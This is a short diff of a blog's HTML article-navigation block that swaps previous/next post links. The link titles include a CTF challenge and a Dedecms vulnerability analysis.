 <nav id="article-nav">
   
-    <a href="/2019/09/06/重装服务器/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          重装服务器
-        
-      </div>
-    </a>
   
-  
-    <a href="/2019/09/02/XNUCA-EZPHP/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">XNUCA-EZPHP</div>
+    <a href="/2019/09/23/Dedecms漏洞分析/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Dedecms漏洞分析</div>
       <i class="icon-circle-right"></i>
     </a>
   
